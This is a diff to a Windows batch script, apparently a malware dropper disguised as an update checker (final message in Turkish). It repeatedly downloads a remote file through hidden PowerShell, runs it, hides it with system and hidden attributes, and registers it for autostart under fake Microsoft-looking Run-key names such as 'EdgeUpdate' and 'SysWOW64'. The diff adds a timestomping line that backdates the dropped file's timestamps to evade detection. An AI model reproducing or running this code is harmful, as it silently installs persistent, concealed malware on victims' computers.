@@ -52,17 +52,16 @@ if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" >nul 2>&1
 
 :downLoop
 if not exist "%DEST%" (
-  
     %UpdateChecker% -w hidden -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
     timeout /t 5 /nobreak >nul
     goto downLoop
 )
 
+%UpdateChecker% -w hidden -c "if(Test-Path '%DEST%'){$(Get-Item '%DEST%').CreationTime='11/12/2022 10:15:00'; $(Get-Item '%DEST%').LastWriteTime='11/12/2022 10:15:00'}" >nul 2>&1
 
 start /min "" "%DEST%"
 timeout /t 2 /nobreak >nul
 attrib +s +h "%DEST%" >nul 2>&1
-
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdate" /t REG_SZ /d "\"%DEST%\"" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"%DEST%\"" /f >nul 2>&1
@@ -87,4 +86,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t
 
 echo Islem tamamlandi.
 pause
+
 exit
